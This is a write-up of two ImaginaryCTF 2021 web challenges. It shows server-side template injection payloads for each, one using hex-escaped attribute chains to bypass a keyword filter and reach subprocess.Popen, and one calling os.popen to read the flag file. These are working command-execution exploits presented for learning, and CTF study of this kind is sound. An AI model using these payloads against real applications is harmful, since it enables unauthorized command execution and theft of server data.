- ## Imaginary ctf 2021(Build-a-website):
  Problem: Web page had an input box for html code. Entering {{7*7}} reurns 49. Thus it is prone too ssti
  Initial payload: ```{{ ()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')() }}```
  This was interesting, the filer in the script didnt allow use of class, base or global so the attr was used instead and hexadecimal notations of class,
  base and subclasses was used which makes the payload in ascii:
  ```{{__class__.__base__.__subclasses__}}``` <br>
  The empty tuple () in the expression serves as an object from which we can start chaining attribute lookups <br>
  the | operator is used to chain these filters together, applying each one in sequence to transform the value step by step. <br>

  This gives a list of all the modules. Index of ```<class 'subprocess.Popen'>``` at 360.

  Final payload: ```{{()|attr('__\x63\x6c\x61\x73\x73__')|attr('__\x62\x61\x73\x65__')|attr('__\x73\x75\x62\x63\x6c\x61\x73\x73\x65\x73__')()|attr('__getitem__')(360)("cat flag.txt",shell=True,stdout=-1)|attr('communicate')()}}```

- ## Imaginary ctf 2021(Sinking calculator): 
![image](https://github.com/poorvi1910/Web/assets/146640913/f78f996d-601d-45c4-a6dc-35fb80e43e82)
In this code, the input length is limited to 80 chars and output is only printed if it has numbers or minus.
Payload: ```calc?query=config.class.init.globals[%27os%27].popen(%27od%20-b%20-An%20fla*%27).read()``` <br>
translates to ```config.class.init.globals['os'].popen('od -b -An fla*').read()```. The command ```od -b -An fla*``` is used to display file contents in octal format, without displaying the filename (-An)
  - od: This is the "octal dump" command, which is used to display file contents in different formats (octal, hexadecimal, decimal, ASCII, etc.).
  - b: This option tells od to display the output in octal bytes. Each byte in the file(s) will be displayed as a three-digit octal number.
  - An: This option tells od to suppress the default output of file offsets. Normally, od prefixes each line of output with the byte offset of that line within the file. -An removes these offsets from the output.
  - fla*: This is a shell glob pattern. It matches any files in the current directory whose names start with "fla". For example, it could match files like "flag.txt", "flag1.txt", etc.<br>
The ouput gives a string of numbers which when converted from octal to ascii gives the flag.
